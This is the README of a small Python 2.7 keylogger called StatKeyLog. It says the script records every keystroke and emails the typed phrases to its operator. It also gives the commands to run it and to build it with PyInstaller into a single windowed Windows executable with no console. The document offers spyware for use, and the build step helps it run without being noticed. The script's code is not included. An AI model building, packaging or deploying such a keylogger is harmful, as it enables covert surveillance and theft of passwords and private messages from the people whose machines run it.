# StatKeyLog
For now the script just logs your keystrokes and sends you an email of every phrase you write.

**HOW TO USE** 

Preferably with Python 2.7
run :

    py -2 log.py
    
to turn it into a windows executable : 

    py -2 -m PyInstaller --windowed --onefile log.py
